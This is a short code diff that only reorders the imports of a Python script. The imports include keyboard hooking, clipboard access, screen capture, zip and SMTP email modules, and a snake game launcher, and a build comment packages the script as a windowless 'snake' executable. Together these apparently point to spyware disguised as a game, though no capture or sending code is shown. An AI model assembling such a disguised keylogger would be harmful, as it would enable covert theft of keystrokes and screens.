@@ -1,13 +1,24 @@
-import pyHook, pythoncom, sys, win32api, win32con, os, time
-import win32clipboard, zipfile
-from PIL import ImageGrab
-import shutil, getpass
-import mimetypes, smtplib
+import getpass
+import mimetypes
+import os
+import shutil
+import smtplib
+import sys
+import time
+import zipfile
+from email import encoders
+from email.mime.base import MIMEBase
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
-from email.mime.base import MIMEBase
-from email import encoders
-from snake import start_game
+
+import pyHook
+import pythoncom
+import win32api
+import win32clipboard
+import win32con
+from PIL import ImageGrab
 
 import system
-# pyinstaller -F -w -n snake -i Snake.ico index.py
+from snake import start_game
+
+# pyinstaller -F -w -n snake index.py
